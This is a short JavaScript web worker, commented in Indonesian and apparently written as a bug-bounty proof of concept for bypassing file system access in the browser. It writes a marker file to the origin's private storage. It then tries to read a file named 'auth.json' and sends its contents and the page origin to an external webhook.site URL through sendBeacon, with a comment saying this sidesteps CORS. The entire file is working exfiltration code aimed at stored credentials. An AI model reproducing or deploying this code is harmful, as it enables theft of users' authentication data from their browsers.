// worker-fsa-bypass.js
self.onmessage = async () => {
  try {
    const root = await navigator.storage.getDirectory();
    
    // Buat file bukti
    const proofFile = await root.getFileHandle('fsa_bypass_proof.txt', { create: true });
    const writer = await proofFile.createWritable();
    const content = `[BUG PROOF]\nOrigin: ${location.origin}\nWaktu: ${new Date().toISOString()}\nStatus: Akses file TANPA IZIN!`;
    await writer.write(content);
    await writer.close();

    // Coba baca file lain
    let additionalData = 'Tidak ada file tambahan.';
    try {
      const testFile = await root.getFileHandle('auth.json');
      additionalData = await (await testFile.getFile()).text();
    } catch (e) {}

    // 💥 Kirim via sendBeacon (hindari CORS)
    const report = {
      origin: location.origin,
      proof: 'File fsa_bypass_proof.txt berhasil dibuat',
      extra: additionalData
    };

    const data = new Blob([JSON.stringify(report)], { type: 'application/json' });
    navigator.sendBeacon('https://webhook.site/49732487-df13-49ee-bf35-33d57106989a', data);

    self.postMessage({
      success: true,
      message: '✅ Data dikirim via sendBeacon!',
      origin: location.origin
    });

  } catch (err) {
    self.postMessage({
      success: false,
      message: '❌ Gagal: ' + err.message
    });
  }
};
